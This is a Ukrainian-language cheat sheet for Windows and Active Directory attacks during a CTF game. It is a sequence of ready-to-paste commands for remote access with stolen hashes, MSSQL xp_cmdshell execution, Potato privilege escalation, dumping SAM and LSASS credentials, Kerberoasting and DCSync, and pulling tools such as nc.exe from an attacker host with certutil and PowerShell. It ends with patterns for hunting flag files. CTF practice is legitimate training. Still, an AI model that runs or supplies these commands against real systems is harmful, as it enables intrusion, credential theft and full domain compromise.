# Windows: Cheatsheet (швидко під час гри)

Найважливіші команди одним екраном. Не дублює інші файли — для деталей/інтерпретації йди за посиланнями.
← [README](README.md) · enum [01](01-enumeration.md) · privesc [03](03-privesc.md) · creds [04](04-credentials.md) · AD [05](05-active-directory.md) · lateral [06](06-lateral-postex.md)

---

## Коротка послідовність
```
nmap -p- -sCV → 445/3389/5985? 88+389=домен
netexec smb/ldap (null,guest,--rid-brute) → список юзерів/шари
доступ: evil-winrm (5985) / xfreerdp (3389) / psexec / mssqlclient
на хості: whoami /all + whoami /priv  → SeImpersonate? → Potato=SYSTEM
accesschk сервіси · AlwaysInstallElevated · GPP/cmdkey/autologon
SYSTEM/адмін → secretsdump SAM/LSASS → PtH на інші хости
домен → BloodHound → Kerberoast/AS-REP/ACL → Domain Admin
на кожному рівні → flag-hunt (нижче)
```

## Доступ з Kali
```bash
evil-winrm -i $T -u user -p pass            # WinRM 5985
evil-winrm -i $T -u user -H <NThash>        # Pass-the-Hash
xfreerdp /u:user /p:pass /v:$T /cert:ignore /dynamic-resolution
netexec smb   $T -u user -p pass --shares
netexec winrm $T -u user -p pass            # Pwn3d! = є доступ
netexec smb   $T -u Administrator -H <NThash>   # PtH-перевірка/spray
impacket-psexec  user:pass@$T               # SYSTEM (гучно)
impacket-wmiexec user:pass@$T               # тихіше
impacket-mssqlclient user:pass@$T           # MSSQL (-windows-auth для доменних); далі RCE через xp_cmdshell:
#   enable_xp_cmdshell            (вбудована команда impacket-mssqlclient; або вручну нижче)
#   EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
#   EXEC xp_cmdshell 'whoami';    → повні кроки/варіанти: ../03-cheatsheets/databases.md#mssql-1433
```

## Enum на хості (копіпаста)
```cmd
whoami /all & whoami /priv
systeminfo & hostname & ipconfig /all
net user & net localgroup administrators & net accounts
wmic service get Name,PathName,StartName,State | findstr /i /v "C:\Windows"
schtasks /query /fo LIST /v | findstr /i "TaskName Run-As Task-To-Run"
netstat -ano | findstr LISTENING
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i password
cmdkey /list
```

## Privesc (швидкі перевірки) → деталі [03](03-privesc.md)
```cmd
whoami /priv | findstr /i "impersonate backup debug"      :: SeImpersonate → Potato
accesschk64.exe /accepteula -uwcqv "Users" *              :: сервіс CHANGE_CONFIG
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
wmic service get Name,PathName,StartMode | findstr /i /v "C:\Windows\\" | findstr /i /v """
:: SeImpersonate → SYSTEM:
PrintSpoofer64.exe -i -c cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"
```

## Credentials → деталі [04](04-credentials.md)
```cmd
reg save HKLM\SAM sam.hiv & reg save HKLM\SYSTEM system.hiv   :: (SYSTEM/адмін)
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsassPID> C:\temp\l.dmp full
```
```bash
impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL
impacket-secretsdump 'DOM/user:pass@'$T            # віддалено (SAM+LSA, на DC +NTDS -just-dc)
pypykatz lsa minidump l.dmp
# крек:  -m 1000 NT · -m 5600 NetNTLMv2 · -m 13100 Kerberoast · -m 18200 AS-REP · -m 2100 DCC2
```

## Active Directory → деталі [05](05-active-directory.md)
```bash
sudo ntpdate $DC                                   # синхрон часу (інакше Kerberos падає)
impacket-GetNPUsers DOM/ -usersfile u.txt -dc-ip $DC -no-pass -request   # AS-REP (без пароля)
impacket-GetUserSPNs DOM/user:pass -dc-ip $DC -request                   # Kerberoast
bloodhound-python -u user -p pass -d DOM -ns $DC -c All --zip            # граф
impacket-secretsdump DOM/user:pass@$DC -just-dc                          # DCSync (як DA)
```

## File transfer (на ціль) → [file-transfer](../02-workflows/file-transfer.md)
```cmd
certutil -urlcache -f http://10.8.N.x:8000/winPEASx64.exe wp.exe
powershell -c "iwr http://10.8.N.x:8000/nc.exe -OutFile nc.exe"
:: з Kali SMB:  impacket-smbserver share . -smb2support   → copy \\10.8.N.x\share\x.exe .
```

## <a id="пошук-прапорців"></a>Пошук прапорців (Windows)
> Літери флагу розбиті сепараторами `-_.`, тож пошук літерального `bestCTF` їх НЕ ловить — лише regex із шумом.

**Основне — готовий скрипт** [flags_searcher.ps1](../05-scripts/flags_searcher.ps1) (залити з `05-scripts/` через [file-transfer](../02-workflows/file-transfer.md)): шукає + **одразу нормалізує** у `bestCTF{...} slot=XY`.
```powershell
powershell -ep bypass -f flags_searcher.ps1                     # C:\ , нормалізований вивід
powershell -ep bypass -f flags_searcher.ps1 -Path C:\Users,C:\inetpub
powershell -ep bypass -f flags_searcher.ps1 -ADS -Registry -EventLogs   # + потоки/реєстр/логи
```
**Fallback — інлайн (коли скрипт не залити):**
```powershell
$fr = 'b[-_.]*e[-_.]*s[-_.]*t[-_.]*C[-_.]*T[-_.]*F[-_.]*\{[A-Za-z0-9_]+\}:[A-Za-z0-9]+'
Get-ChildItem C:\ -Recurse -Include *.txt,*.config,*.xml,*.ini,*.log -EA SilentlyContinue |
  Select-String -Pattern $fr -CaseSensitive -EA SilentlyContinue
# за іменем + ADS (альтернативні потоки):
gci C:\ -Recurse -Filter *flag* -EA 0 ; dir /r C:\Users\ | findstr /i ":\$DATA"
```
```cmd
dir C:\*flag* /s /b
findstr /s /i "best" C:\Users\*.txt C:\inetpub\*.* 2>nul
```
Місця: `C:\Users\*\Desktop|Documents`, `C:\inetpub\wwwroot`, `C:\xampp`, `C:\Program Files*`, реєстр, Event Logs ([07](07-forensics-logs.md)), ADS.
> `findstr`/cmd **не** ловить шумовий формат (немає `*` по групах) — для флагів потрібен PowerShell-regex/скрипт вище. Нормалізація у `bestCTF{FLAG}`: скрипт робить сам; сирий збіг → [flag-encode.sh](../05-scripts/flag-encode.sh) на Kali. Формат — [flag-hunting](../01-roadmaps/flag-hunting.md).

## Пастки
- `whoami` замість `whoami /priv` → пропущений SeImpersonate.
- Kerberos по IP замість FQDN; неспівпадіння часу з DC.
- Плутати NT-хеш (PtH/`-m 1000`) і NetNTLMv2 (тільки крек `-m 5600`).
- Забути перевірити ADS (`dir /r`) при пошуку прапорців.
